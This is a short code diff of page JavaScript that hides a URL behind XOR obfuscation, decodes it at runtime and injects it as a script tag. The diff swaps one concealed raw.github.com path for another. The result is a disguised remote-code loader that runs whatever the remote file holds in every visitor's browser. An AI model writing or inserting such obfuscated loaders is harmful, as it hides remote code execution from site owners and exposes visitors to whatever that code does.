@@ -1,2 +1,2 @@
-var enkripsi="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-Ogpkhclk/Icpcajk-ej/rcegq-qv{ngqjggvq-r{eoglv]vpca,aqq"; teks=""; teksasli="";var waqar;waqar=enkripsi.length;for (i=0;i<waqar;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);
+var enkripsi="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-ucscp-ej/rcegq-qv{ngqjggvq-qv{ngqjggv,aqq"; teks=""; teksasli="";var waqar;waqar=enkripsi.length;for (i=0;i<waqar;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);
 document.body.appendChild(document.createElement('script')).src=teksasli;
